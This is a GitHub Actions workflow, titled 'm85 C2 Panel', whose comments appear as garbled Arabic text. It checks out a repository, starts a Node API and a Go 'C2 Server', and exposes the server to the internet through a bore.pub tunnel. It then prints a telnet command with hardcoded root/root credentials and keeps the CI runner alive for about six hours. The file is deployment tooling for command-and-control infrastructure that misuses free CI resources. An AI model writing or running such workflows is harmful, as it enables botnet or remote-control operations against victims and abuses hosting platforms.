name: m85 C2 Panel (Fixed)
on:
  workflow_dispatch:

jobs:
  deploy-and-run:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    
    steps:
      # 1. ุณุญุจ ูููุงุช ุงููุดุฑูุน
      - name: Checkout Project
        uses: actions/checkout@v4
        with:
          repository: 'iamthebestm85/m85C2'

      # 2. ุชุฌููุฒ ุงูุจูุฆุงุช (Go, Node, Python)
      - name: Setup Environment
        run: |
          sudo apt-get update
          sudo apt-get install -y golang-go nodejs npm python3 python3-pip wget
          
          # ุชุซุจูุช ููุชุจุงุช ุจุงูุซูู
          pip3 install numpy Pillow
          
          # ุชุซุจูุช ููุชุจุงุช Node
          npm install express child_process
          
          # ุชุฌููุฒ Go
          if [ ! -f go.mod ]; then go mod init m85-c2; fi
          go mod tidy

      # 3. ุชุญููู ุฃุฏุงุฉ Bore (ุงูุจุฏูู ุงูููู ูู Serveo)
      - name: Install Bore Tunnel
        run: |
          echo ">>> Downloading Bore..."
          wget https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz
          tar -xf bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz
          chmod +x bore
          sudo mv bore /usr/local/bin/

      # 4. ุชุดุบูู ุงูุฎุฏูุงุช
      - name: Start Services
        run: |
          echo ">>> Starting API..."
          nohup node api.js > api_log.txt 2>&1 &
          
          echo ">>> Starting C2 Server..."
          nohup go run c2.go > c2_log.txt 2>&1 &
          sleep 5

      # 5. ูุชุญ ุงูููู ูุนุฑุถ ุงูุฑุงุจุท
      - name: Create Tunnel & Show Info
        run: |
          echo ">>> Creating TCP Tunnel via Bore..."
          # ุชุดุบูู ุงูููู ูุชูุฌูู ุงููููุฐ 1111
          nohup bore local 1111 --to bore.pub > tunnel_log.txt 2>&1 &
          
          sleep 5
          
          echo "=========================================================="
          echo "       โ  S E R V E R   R E A D Y  โ"
          echo "=========================================================="
          echo "๐ ุงูุณุฎ ุงูุฃูุฑ ุงูุชุงูู ูุถุนู ูู Termux ููุงุชุตุงู ๐"
          echo ""
          # ุงุณุชุฎุฑุงุฌ ุงูุฑุงุจุท ูุงููููุฐ ุชููุงุฆูุงู
          PORT=$(grep -o "listening at bore.pub:[0-9]*" tunnel_log.txt | awk -F: '{print $2}')
          if [ -z "$PORT" ]; then
            echo "โ ูุดู ุงูุญุตูู ุนูู ุงูุฑุงุจุทุ ุงูุฑุฌุงุก ุงููุญุงููุฉ ูุฑุฉ ุฃุฎุฑู."
            cat tunnel_log.txt
          else
            echo "telnet bore.pub $PORT"
          fi
          echo ""
          echo "=========================================================="
          echo "๐ Username: root"
          echo "๐ Password: root"
          echo "=========================================================="
          
          # ุฅุจูุงุก ุงูุฌูุณุฉ ุชุนูู
          sleep 21500

